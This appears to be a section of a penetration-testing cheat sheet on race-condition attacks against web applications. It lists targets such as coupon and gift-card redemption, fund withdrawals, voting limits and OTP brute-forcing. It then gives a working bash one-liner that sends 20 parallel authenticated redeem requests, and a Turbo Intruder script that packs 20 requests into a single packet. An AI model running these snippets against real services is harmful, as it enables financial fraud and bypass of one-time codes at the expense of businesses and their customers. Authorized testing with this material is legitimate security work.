## Race Conditions

- [ ] Coupon codes / promo codes
- [ ] Gift card redemption
- [ ] Fund transfer / withdrawal
- [ ] Voting / rating limits
- [ ] OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl --max-time 30 --connect-timeout 10 -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder -- Single-Packet Attack (All Requests Arrive Simultaneously)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

